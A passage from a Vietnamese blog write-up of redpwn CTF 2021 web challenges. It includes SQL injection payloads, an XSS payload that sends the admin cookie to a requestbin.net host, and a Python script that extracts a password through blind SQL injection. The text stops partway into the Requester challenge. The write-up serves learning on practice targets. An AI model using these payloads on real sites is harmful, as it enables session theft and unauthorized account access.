@@ -1,0 +1,580 @@
+
+
+<!DOCTYPE html>
+<html lang="en">
+
+  <head>
+    <meta charset="utf-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<link rel="icon" href="https://i.imgur.com/ZfgJjwV.png" type="image/icon type">
+<title>RTinFew Blogs | Blog security</title>
+<meta name="generator" content="Jekyll v3.9.0" />
+<meta property="og:title" content="RTinFew Blogs" />
+<meta name="author" content="Lê Nguyễn Tiến Vinh" />
+<meta property="og:locale" content="en" />
+<meta name="description" content="Dưới đây là một số challenge mà mình giải quyết được và ở CTF lần này mình cũng chỉ giải được 8/13, có lẽ do kiến thức mình vẫn đang còn yếu nên các bài sau mình chưa có thể giải quyết được. Mong các bạn đọc tham khảo và đừng ném đá nhé :(/>
+<link rel="canonical" href="https://rtinfew.github.io/CTF/pwn" />
+<meta property="og:url" content="https://rtinfew.github.io/CTF/pwn" />
+<meta property="og:site_name" content="RTinFew Blogs" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2021-07-13T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="RTinFew Blogs" />
+<meta name="twitter:site" content="@Lê Nguyễn Tiến Vinh" />
+<meta name="twitter:creator" content="@Lê Nguyễn Tiến Vinh" />
+<meta name="google-site-verification" content="u4WXQl0Eu66rsQo2kRdCNx" />
+
+
+
+
+
+
+
+<!-- Google Fonts -->
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Open%20Sans|Roboto|Roboto%20Slab|Inconsolata|Dancing%20Script|Noto%20Sans%20SC|Noto%20Sans%20TC|Noto%20Serif%20SC|Noto%20Serif%20TC|Ma%20Shan%20Zheng">
+
+<link rel="stylesheet" href="assets/css/main.css">
+<link rel="stylesheet" href="assets/css/skin.css">
+
+
+<script async src="https://use.fontawesome.com/releases/v5.0.12/js/all.js"></script>
+
+
+
+
+  </head>
+
+  <body>
+    <div class="site-container">
+      <header class="site-header">
+        <div class="wrapper">
+  <script>
+    function clickSidebarButton() {
+      const elem = document.getElementById("site-sidebar")
+      if (elem.style.display == "none" || elem.style.display == "") {
+        elem.style.display = "block";
+      } else {
+        elem.style.display = "none";
+      }
+    }
+  </script>
+  <a class="site-sidebar-button" onclick="clickSidebarButton()"><i class="far fa-user"></i>
+  </a>
+
+  <a class="site-title" rel="author" href="/CTF">RTinFew Blogs</a>
+
+  
+    <nav class="site-nav">
+      <input type="checkbox" id="nav-trigger" class="nav-trigger" />
+      <label for="nav-trigger" title="nav-trigger">
+        <span class="menu-icon">
+          <svg viewBox="0 0 18 15" width="18px" height="15px">
+            <path d="M18,1.484c0,0.82-0.665,1.484-1.484,1.484H1.484C0.665,2.969,0,2.304,0,1.484l0,0C0,0.665,0.665,0,1.484,0 h15.032C17.335,0,18,0.665,18,1.484L18,1.484z M18,7.516C18,8.335,17.335,9,16.516,9H1.484C0.665,9,0,8.335,0,7.516l0,0 c0-0.82,0.665-1.484,1.484-1.484h15.032C17.335,6.031,18,6.696,18,7.516L18,7.516z M18,13.516C18,14.335,17.335,15,16.516,15H1.484 C0.665,15,0,14.335,0,13.516l0,0c0-0.82,0.665-1.483,1.484-1.483h15.032C17.335,12.031,18,12.695,18,13.516L18,13.516z"/>
+          </svg>
+        </span>
+      </label>
+
+      <ul class="trigger">
+              <li><a class="" href="/CTF/categories">Categories</a></li>
+            </ul>
+    </nav>
+  
+</div>
+
+      </header>
+      
+      <div class="site-body wrapper">
+        <aside class="site-sidebar" id="site-sidebar">
+          
+            <h3 class="toc-title">Table of Contents</h3>
+<nav class="toc-nav">
+  <ul class="toc">
+  <li><a href="#challenge-inspect-me">Challenge inspect-me</a>
+    <ul>
+      <li><a href="#solution">Solution</a></li>
+    </ul>
+  </li>
+  <li><a href="#challenge-orm-bad">Challenge orm-bad</a>
+    <ul>
+      <li><a href="#solution-1">Solution</a></li>
+      <li><a href="#payload">Payload</a></li>
+    </ul>
+  </li>
+  <li><a href="#challenge-pastebin-1">Challenge pastebin-1</a>
+    <ul>
+      <li><a href="#solution-2">Solution</a></li>
+      <li><a href="#payload-1">Payload</a></li>
+    </ul>
+  </li>
+  <li><a href="#challenge-secure">Challenge secure</a>
+    <ul>
+      <li><a href="#solution-3">Solution</a></li>
+      <li><a href="#payload-2">Payload</a></li>
+    </ul>
+  </li>
+  <li><a href="#challenge-cool">Challenge cool</a>
+    <ul>
+      <li><a href="#solution-4">Solution</a></li>
+      <li><a href="#payload-3">Payload</a></li>
+    </ul>
+  </li>
+  <li><a href="#challenge-requester">Challenge Requester</a>
+    <ul>
+      <li><a href="#solution-5">Solution</a></li>
+      <li><a href="#payload-4">Payload</a></li>
+    </ul>
+  </li>
+  <li><a href="#challenge-requester-strikes-back">Challenge requester-strikes-back</a>
+    <ul>
+      <li><a href="#solution-6">Solution</a></li>
+      <li><a href="#payload-5">Payload</a></li>
+    </ul>
+  </li>
+  <li><a href="#challenge-notes">Challenge notes</a>
+    <ul>
+      <li><a href="#solution-7">Solution</a></li>
+      <li><a href="#payload-6">Payload</a></li>
+    </ul>
+  </li>
+  <li><a href="#lời-kết">Lời kết</a></li>
+</ul>
+
+</nav>
+
+          
+        </aside>
+        <main class="site-main" id="site-main" aria-label="Content" tabindex="1">
+          <article class="post h-entry" itemscope itemtype="http://schema.org/BlogPosting">
+
+  <header class="post-header">
+
+    <h1 class="post-title p-name" itemprop="name headline">[WRITEUP REDPWN CTF 2021]: WEB</h1>
+    <p class="post-meta"><time class="dt-published" datetime="2021-07-13T00:00:00+00:00" itemprop="datePublished">
+        Jul 13, 2021
+      </time></p>
+
+  </header>
+
+  <div class="post-content e-content" itemprop="articleBody">
+    <p>Dưới đây là một số challenge mà mình giải quyết được và ở CTF lần này mình cũng chỉ giải được 8/13, có lẽ do kiến thức mình vẫn đang còn yếu nên các bài sau mình chưa có thể giải quyết được. Mong các bạn đọc tham khảo và đừng ném đá nhé :(</p>
+
+<p>Nếu bài nào có source code thì mình sẽ bỏ ở đây, các bạn có thể tải nó về nhé
+<a href="https://github.com/RTinFew/tree/master/source/Redpwn">SOURCE</a></p>
+<h2 id="challenge-inspect-me">Challenge inspect-me</h2>
+<p>Ở bài này thì phần description đã nhắc đến là flag ở vẫn mã nguồn =&gt; chúng ta chỉ cần bật mã nguồn lên và tìm thử nó xem sao.</p>
+
+<h3 id="solution">Solution</h3>
+<p>Bật mã nguồn lên và Ctrl+F và tìm format flag là <code class="language-plaintext highlighter-rouge">flag{</code> thì chúng ta tìm được flag <code class="language-plaintext highlighter-rouge">flag{inspect_me_like_123}</code>.</p>
+
+<h2 id="challenge-orm-bad">Challenge orm-bad</h2>
+<p>Ở bài này thì chúng ta được cung cấp một file <code class="language-plaintext highlighter-rouge">app.js</code> vì vậy ta thử mở nó lên đọc xem nó hoạt động như nào.
+Đọc sơ qua source thì chúng ta thấy được</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nx">crypto</span><span class="p">.</span><span class="nx">randomBytes</span><span class="p">(</span><span class="mi">32</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">buf</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+<span class="c1">// if you managed to make this error you deserve it</span>
+<span class="k">if</span> <span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+    <span class="k">throw</span> <span class="nx">err</span><span class="p">;</span>
+<span class="p">}</span>
+<span class="nx">db</span><span class="p">.</span><span class="nx">all</span><span class="p">(</span><span class="dl">"</span><span class="s2">INSERT INTO users VALUES ('admin', $1)</span><span class="dl">"</span><span class="p">,</span> <span class="p">[</span><span class="nx">buf</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">)]);</span>
+<span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="dl">"</span><span class="s2">Admin password: </span><span class="dl">"</span> <span class="o">+</span> <span class="nx">buf</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="dl">'</span><span class="s1">hex</span><span class="dl">'</span><span class="p">));</span>
+</code></pre></div></div>
+<p>Ở đoạn code này thì trong db có chứa account admin và password sẽ được random. Tiếp tục thấy có 1 router là <code class="language-plaintext highlighter-rouge">/flag</code> và đọc thì thấy nếu như chúng ta có thể đăng nhập với admin thì sẽ có flag, được thể hiện ở đoạn code dưới đây</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">db</span><span class="p">.</span><span class="nx">all</span><span class="p">(</span><span class="dl">"</span><span class="s2">SELECT * FROM users WHERE username='</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">' AND password='</span><span class="dl">"</span> <span class="o">+</span> <span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span> <span class="o">+</span> <span class="dl">"</span><span class="s2">'</span><span class="dl">"</span><span class="p">,</span> <span class="p">(</span><span class="nx">err</span><span class="p">,</span> <span class="nx">rows</span><span class="p">)</span> <span class="o">=&gt;</span> <span class="p">{</span>
+<span class="k">try</span> <span class="p">{</span>
+	<span class="k">if</span> <span class="p">(</span><span class="nx">rows</span><span class="p">.</span><span class="nx">length</span> <span class="o">==</span> <span class="mi">0</span><span class="p">)</span> <span class="p">{</span>
+	            <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/?alert=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="dl">"</span><span class="s2">you are not admin :(</span><span class="dl">"</span><span class="p">));</span>
+	        <span class="p">}</span> <span class="k">else</span> <span class="k">if</span><span class="p">(</span><span class="nx">rows</span><span class="p">[</span><span class="mi">0</span><span class="p">].</span><span class="nx">username</span> <span class="o">===</span> <span class="dl">"</span><span class="s2">admin</span><span class="dl">"</span><span class="p">)</span> <span class="p">{</span>
+	            <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/?alert=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="nx">flag</span><span class="p">));</span>
+	        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+	            <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="dl">"</span><span class="s2">/?alert=</span><span class="dl">"</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">(</span><span class="dl">"</span><span class="s2">you are not admin :(</span><span class="dl">"</span><span class="p">));</span>
+	        <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div></div>
+<p>Chú ý vào câu query thì thấy được đầu vào không được filter hay block gì cả =&gt; ez sql injection.</p>
+
+<h3 id="solution-1">Solution</h3>
+<p>Vậy bây giờ chúng ta chỉ cần cho username=admin và set password trả về true là được</p>
+
+<h3 id="payload">Payload</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>username=admin&amp;password=' or True -- -
+</code></pre></div></div>
+<p>Flag -&gt; <code class="language-plaintext highlighter-rouge">flag{sqli_overused_again_0b4f6}</code></p>
+
+<h2 id="challenge-pastebin-1">Challenge pastebin-1</h2>
+<p>Chúng ta được cung cấp 1 file RUST là <code class="language-plaintext highlighter-rouge">main.rs</code> =&gt; trang web này được viết bằng RUST. Đọc source thì thấy có function create có chức năng sẽ nhận vào một content tiếp tục. content không được filter hay block gì.
+Và ở description tác giả có nhắc đến cookie admin vậy có lẽ là xss.</p>
+
+<h3 id="solution-2">Solution</h3>
+<p>Thử payload trigger xss như <code class="language-plaintext highlighter-rouge">&lt;script&gt;alert(1);&lt;/script&gt;</code> =&gt; thành công. Vậy bây giờ chúng ta chỉ cần get cookie admin và cũng như đó là flag.</p>
+
+<h3 id="payload-1">Payload</h3>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">&lt;</span><span class="nx">script</span><span class="o">&gt;</span><span class="nb">document</span><span class="p">.</span><span class="nx">location</span><span class="o">=</span><span class="dl">"</span><span class="s2">http://requestbin.net/r/gkwyrn0t?cc=</span><span class="dl">"</span><span class="o">+</span><span class="nx">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">cookie</span><span class="p">)</span><span class="o">&lt;</span><span class="sr">/script</span><span class="err">&gt;
+</span></code></pre></div></div>
+<p>Copy url /view?id của các bạn và send cho bot để visit. Cuối cùng base64 decode chuỗi nhận được sẽ có flag
+flag -&gt; <code class="language-plaintext highlighter-rouge">flag{d1dn7_n33d_70_b3_1n_ru57}</code></p>
+
+<h2 id="challenge-secure">Challenge secure</h2>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">db</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="s2">`INSERT INTO users (username, password) VALUES (
+    '</span><span class="p">${</span><span class="nx">btoa</span><span class="p">(</span><span class="dl">'</span><span class="s1">admin</span><span class="dl">'</span><span class="p">)}</span><span class="s2">',
+    '</span><span class="p">${</span><span class="nx">btoa</span><span class="p">(</span><span class="nx">crypto</span><span class="p">.</span><span class="nx">randomUUID</span><span class="p">)}</span><span class="s2">'
+)`</span><span class="p">);</span>
+</code></pre></div></div>
+<p>Chú ý vô code trên thì thấy trong db có chứa account admin là username=base64 encode của admin và password là base64 encode của chuỗi random.
+Ở router <code class="language-plaintext highlighter-rouge">/login</code></p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">query</span> <span class="o">=</span> <span class="s2">`SELECT id FROM users WHERE
+          username = '</span><span class="p">${</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">username</span><span class="p">}</span><span class="s2">' AND
+          password = '</span><span class="p">${</span><span class="nx">req</span><span class="p">.</span><span class="nx">body</span><span class="p">.</span><span class="nx">password</span><span class="p">}</span><span class="s2">';`</span><span class="p">;</span>
+  <span class="k">try</span> <span class="p">{</span>
+    <span class="kd">const</span> <span class="nx">id</span> <span class="o">=</span> <span class="nx">db</span><span class="p">.</span><span class="nx">prepare</span><span class="p">(</span><span class="nx">query</span><span class="p">).</span><span class="kd">get</span><span class="p">()?.</span><span class="nx">id</span><span class="p">;</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">id</span><span class="p">)</span> <span class="k">return</span> <span class="nx">res</span><span class="p">.</span><span class="nx">redirect</span><span class="p">(</span><span class="s2">`/?message=</span><span class="p">${</span><span class="nx">process</span><span class="p">.</span><span class="nx">env</span><span class="p">.</span><span class="nx">FLAG</span><span class="p">}</span><span class="s2">`</span><span class="p">);</span>
+</code></pre></div></div>
+<p>câu query trên truyền trực tiếp username và password là 2 cái chúng ta có thể control đc mà không bị filter bất cứ thứ gì =&gt; ez sql injection
+Nhưng đời không như là mơ có một script xử lý username và password ở phía client</p>
+<div class="language-js highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kd">const</span> <span class="nx">username</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">input</span><span class="dl">'</span><span class="p">);</span>
+        <span class="nx">username</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">username</span><span class="dl">'</span><span class="p">);</span>
+        <span class="nx">username</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">value</span><span class="dl">'</span><span class="p">,</span>
+          <span class="nx">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">'</span><span class="s1">#username</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">)</span>
+        <span class="p">);</span>
+
+        <span class="kd">const</span> <span class="nx">password</span> <span class="o">=</span> <span class="nb">document</span><span class="p">.</span><span class="nx">createElement</span><span class="p">(</span><span class="dl">'</span><span class="s1">input</span><span class="dl">'</span><span class="p">);</span>
+        <span class="nx">password</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">name</span><span class="dl">'</span><span class="p">,</span> <span class="dl">'</span><span class="s1">password</span><span class="dl">'</span><span class="p">);</span>
+        <span class="nx">password</span><span class="p">.</span><span class="nx">setAttribute</span><span class="p">(</span><span class="dl">'</span><span class="s1">value</span><span class="dl">'</span><span class="p">,</span>
+          <span class="nx">btoa</span><span class="p">(</span><span class="nb">document</span><span class="p">.</span><span class="nx">querySelector</span><span class="p">(</span><span class="dl">'</span><span class="s1">#password</span><span class="dl">'</span><span class="p">).</span><span class="nx">value</span><span class="p">)</span>
+        <span class="p">);</span>
+</code></pre></div></div>
+<p>nó sẽ base64 encode username và password mình nhập vào rồi sau đó mới mang đi xử lý.</p>
+
+<h3 id="solution-3">Solution</h3>
+<p>Vậy bây giờ mình chỉ cần sử dụng burp để bắt request đoạn base64 encode data của mình gửi lên và sửa password trả về true thì ez có flag :)</p>
+
+<h3 id="payload-2">Payload</h3>
+<p><img src="https://user-images.githubusercontent.com/54855855/125384444-21323b00-e3c3-11eb-9bae-ea1d026ff4f8.png" alt="image" />
+Flag -&gt; <code class="language-plaintext highlighter-rouge">flag{50m37h1n6_50m37h1n6_cl13n7_n07_600d}</code></p>
+
+<h2 id="challenge-cool">Challenge cool</h2>
+<p>Bài này tiếp tục lại là sql injection nhưng khó hơn các bài bài trước một xíu. Tiếp tục với việc đọc code được cung cấp. Mình sẽ tập trung vào 3 router chính đó là <code class="language-plaintext highlighter-rouge">/login</code>, <code class="language-plaintext highlighter-rouge">/register</code>, <code class="language-plaintext highlighter-rouge">/message</code>.
+Thì đầu tiên là <code class="language-plaintext highlighter-rouge">/login</code>, chương trình nhận vô 2 tham số <code class="language-plaintext highlighter-rouge">username</code> và <code class="language-plaintext highlighter-rouge">password</code> sau đó truyền 2 tham số đó vô hàm <code class="language-plaintext highlighter-rouge">check_login()</code>, nếu như đăng nhập thành công thì redirect tới <code class="language-plaintext highlighter-rouge">/message</code>.
+Hàm <code class="language-plaintext highlighter-rouge">check_login()</code></p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">allowed_characters</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">username</span><span class="p">):</span>
+        <span class="k">return</span> <span class="bp">False</span>
+    <span class="n">correct_password</span> <span class="o">=</span> <span class="n">execute</span><span class="p">(</span>
+        <span class="sa">f</span><span class="s">'SELECT password FROM users WHERE username=</span><span class="se">\'</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="se">\'</span><span class="s">;'</span>
+    <span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">correct_password</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">return</span> <span class="bp">False</span>
+    <span class="k">return</span> <span class="n">correct_password</span><span class="p">[</span><span class="mi">0</span><span class="p">][</span><span class="mi">0</span><span class="p">]</span> <span class="o">==</span> <span class="n">password</span>
+</code></pre></div></div>
+<p>Nếu như username nhập vô chứa các kí tự khác ngoài <code class="language-plaintext highlighter-rouge">allowed_characters</code> =&gt; return false. (allowed_characters được khai báo ở đầu code chỉ cho các kí tự <code class="language-plaintext highlighter-rouge">a-zA-Z0-9</code>)
+Kiếm tra password trong db và và password nhập vào đúng thì trả về true. Vậy ở đây có thể thấy được có thể sql injection ở username nhưng username đã bị block các kí tự khác ngoài các kí tự ở trên nên không thể escape.
+Router <code class="language-plaintext highlighter-rouge">/register</code> có gọi hàm <code class="language-plaintext highlighter-rouge">create_user</code> được thể hiện dưới đây</p>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="k">if</span> <span class="nb">any</span><span class="p">(</span><span class="n">c</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">allowed_characters</span> <span class="k">for</span> <span class="n">c</span> <span class="ow">in</span> <span class="n">username</span><span class="p">):</span>
+        <span class="k">return</span> <span class="p">(</span><span class="bp">False</span><span class="p">,</span> <span class="s">'Alphanumeric usernames only, please.'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">username</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">1</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">(</span><span class="bp">False</span><span class="p">,</span> <span class="s">'Username is too short.'</span><span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">password</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">50</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">(</span><span class="bp">False</span><span class="p">,</span> <span class="s">'Password is too long.'</span><span class="p">)</span>
+    <span class="n">other_users</span> <span class="o">=</span> <span class="n">execute</span><span class="p">(</span>
+        <span class="sa">f</span><span class="s">'SELECT * FROM users WHERE username=</span><span class="se">\'</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="se">\'</span><span class="s">;'</span>
+    <span class="p">)</span>
+    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">other_users</span><span class="p">)</span> <span class="o">&gt;</span> <span class="mi">0</span><span class="p">:</span>
+        <span class="k">return</span> <span class="p">(</span><span class="bp">False</span><span class="p">,</span> <span class="s">'Username taken.'</span><span class="p">)</span>
+    <span class="n">execute</span><span class="p">(</span>
+        <span class="s">'INSERT INTO users (username, password)'</span>
+        <span class="sa">f</span><span class="s">'VALUES (</span><span class="se">\'</span><span class="si">{</span><span class="n">username</span><span class="si">}</span><span class="se">\'</span><span class="s">, </span><span class="se">\'</span><span class="si">{</span><span class="n">password</span><span class="si">}</span><span class="se">\'</span><span class="s">);'</span>
+    <span class="p">)</span>
+    <span class="k">return</span> <span class="p">(</span><span class="bp">True</span><span class="p">,</span> <span class="s">''</span><span class="p">)</span>
+</code></pre></div></div>
+<p>Tiếp tục username được check các kí tự cho phép và password không check các kí tự nào được phép, password chỉ check độ dài length &gt; 50 thì return false. Query INSERT INTO đưa thẳng username và password vào =&gt; có thể sql injection ở password.
+Để có được flag thì chúng ta cần đăng nhập vô tài khoản có tên là <code class="language-plaintext highlighter-rouge">ginkoid</code> và tài khoản này được tạo khi start server.</p>
+
+<h3 id="solution-4">Solution</h3>
+<p>Vì bài này sử dụng sqlite nên chúng ta sử dụng <code class="language-plaintext highlighter-rouge">||</code> để nối chuỗi. Idea là đăng kí username bất kì và substr password của ginkoid. Sau đó login với username đó và password chạy từ a-zA-Z0-9 nếu như login thành công thì chữ cái đó là password của <code class="language-plaintext highlighter-rouge">ginkoid</code> và tiếp tục như thế đến hết.
+Password chỉ không được vượt quá 51 nên chúng ta không thể sử dụng <code class="language-plaintext highlighter-rouge">'||(select substr(password,1,1)from users) limit 1||'</code>, nhưng vì acccout <code class="language-plaintext highlighter-rouge">ginkoid</code> ở đầu tiên trong db nên chúng ta chỉ cần <code class="language-plaintext highlighter-rouge">'||(select substr(password,1,1)from users)||'</code> thì nó sẽ tự động lấy record đầu tiên trong table.</p>
+
+<h3 id="payload-3">Payload</h3>
+<div class="language-py highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="kn">import</span> <span class="nn">string</span>
+<span class="kn">import</span> <span class="nn">requests</span>
+<span class="kn">from</span> <span class="nn">random</span> <span class="kn">import</span> <span class="n">SystemRandom</span>
+
+<span class="c1">#nwinY6GFBqOLn55vInCFnraPJzjFZhYw
+#flag{44r0n_s4ys_s08r137y_1s_c00l}
+</span><span class="n">rand</span> <span class="o">=</span> <span class="n">SystemRandom</span><span class="p">()</span>
+<span class="n">list_char</span> <span class="o">=</span> <span class="nb">set</span><span class="p">(</span><span class="s">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ123456789'</span><span class="p">)</span>
+<span class="n">passwd</span> <span class="o">=</span> <span class="s">''</span>
+
+<span class="k">def</span> <span class="nf">create_user</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">i</span><span class="p">):</span>
+    <span class="n">url1</span> <span class="o">=</span> <span class="s">'https://cool.mc.ax/register'</span>
+    <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'username'</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s">'password'</span><span class="p">:</span><span class="sa">f</span><span class="s">"'||(select substr(password,</span><span class="si">{</span><span class="n">i</span><span class="si">}</span><span class="s">,1)from users)||'"</span><span class="p">}</span>
+    <span class="c1"># print(data)
+</span>    <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url1</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+    <span class="c1"># print(r.text)
+</span>    <span class="k">print</span><span class="p">(</span><span class="s">'done'</span><span class="p">)</span>
+
+<span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
+    <span class="k">global</span> <span class="n">passwd</span>
+
+    <span class="n">url2</span> <span class="o">=</span> <span class="s">'https://cool.mc.ax/'</span>
+    <span class="k">for</span> <span class="n">char</span> <span class="ow">in</span> <span class="n">string</span><span class="p">.</span><span class="n">ascii_letters</span><span class="o">+</span><span class="n">string</span><span class="p">.</span><span class="n">digits</span><span class="p">:</span>
+        <span class="c1"># print(passwd + char, end='\r')
+</span>        <span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">'username'</span><span class="p">:</span><span class="n">username</span><span class="p">,</span><span class="s">'password'</span><span class="p">:</span><span class="n">char</span><span class="p">}</span>
+        <span class="c1"># print(data)
+</span>        <span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">url</span><span class="o">=</span><span class="n">url2</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
+        <span class="c1"># print(r.text)
+</span>        <span class="k">if</span> <span class="s">'You are logged in'</span> <span class="ow">in</span> <span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">:</span>
+            <span class="n">passwd</span> <span class="o">+=</span> <span class="n">char</span>
+            <span class="k">print</span><span class="p">(</span><span class="n">passwd</span><span class="p">)</span>
+            <span class="k">break</span>
+    <span class="k">else</span><span class="p">:</span>
+        <span class="k">pass</span>
+
+<span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span><span class="mi">33</span><span class="p">):</span>
+    <span class="n">username</span> <span class="o">=</span> <span class="s">''</span><span class="p">.</span><span class="n">join</span><span class="p">([</span><span class="n">rand</span><span class="p">.</span><span class="n">choice</span><span class="p">(</span><span class="nb">list</span><span class="p">(</span><span class="n">list_char</span><span class="p">))</span> <span class="k">for</span> <span class="n">_</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">32</span><span class="p">)])</span>
+    <span class="n">create_user</span><span class="p">(</span><span class="n">username</span><span class="p">,</span><span class="n">i</span><span class="p">)</span>
+    <span class="n">login</span><span class="p">()</span>
+</code></pre></div></div>
+<p>Cuối cùng đăng nhập <code class="language-plaintext highlighter-rouge">username=ginkoid&amp;password=nwinY6GFBqOLn55vInCFnraPJzjFZhYw</code>
+flag -&gt; <code class="language-plaintext highlighter-rouge">flag{44r0n_s4ys_s08r137y_1s_c00l}</code></p>
+
+<h2 id="challenge-requester">Challenge Requester</h2>
+<p>Đầu tiên được cung cấp một source code java nên vì vậy cần 1 tool decompiler. Ở đây mình sử dụng <a href="https://github.com/java-decompiler/jd-gui">jd-gui</a>.
+Sau khi decompiler thì sẽ bắt đầu đọc và hiểu follow của code. Có 3 router chính ở trang web này là <code class="language-plaintext highlighter-rouge">/</code> -&gt; index.jts (trang chủ), <code class="language-plaintext highlighter-rouge">/createUser</code> -&gt; tạo user, <code class="language-plaintext highlighter-rouge">testAPI</code> -&gt; call API. Cả 3 router này đều được sử dụng method GET
+Router <code class="language-plaintext highlighter-rouge">/createUser</code> gọi đến function createUser nằm trong class Handlers.</p>
+<div class="language-java highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nc">String</span> <span class="n">username</span> <span class="o">=</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span><span class="n">ctx</span><span class="o">.</span><span class="na">queryParam</span><span class="o">(</span><span class="s">"username"</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">get</span><span class="o">();</span>
+    <span class="nc">String</span> <span class="n">password</span> <span class="o">=</span> <span class="o">(</span><span class="nc">String</span><span class="o">)</span><span class="n">ctx</span><span class="o">.</span><span class="na">queryParam</span><span class="o">(</span><span class="s">"password"</span><span class="o">,</span> <span class="nc">String</span><span class="o">.</span><span class="na">class</span><span class="o">).</span><span class="na">get</span><span class="o">();</span>
+    <span class="k">try</span> <span class="o">{</span>
+      <span class="nc">Main</span><span class="o">.</span><span class="na">db</span><span class="o">.</span><span class="na">createDatabase</span><span class="o">(</span><span class="n">username</span><span class="o">);</span>
